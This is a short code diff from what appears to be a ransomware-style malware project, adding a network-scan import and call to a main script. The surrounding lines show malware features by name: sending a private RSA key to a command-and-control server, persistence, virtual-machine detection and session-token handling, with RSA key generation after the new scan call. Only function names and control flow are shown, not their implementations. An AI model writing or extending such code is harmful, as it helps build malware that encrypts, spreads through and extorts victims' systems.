@@ -7,6 +7,7 @@ from RSA_Key_Handling import send_private_key_to_c2
 from Persistence import os_check
 from VM_Check import running_in_vm
 from Session_Handling import get_session_token
+from Network import network_scan
 
 ####################################################################################################################
 
@@ -31,6 +32,7 @@ if timer_data:
     watchdog_process.start()
 
 else:
+    network_scan()
     print("No Timer Data Exist") # Debug Message
     # Generate the RSA keys
     private_key, public_key = generate_rsa_keys()
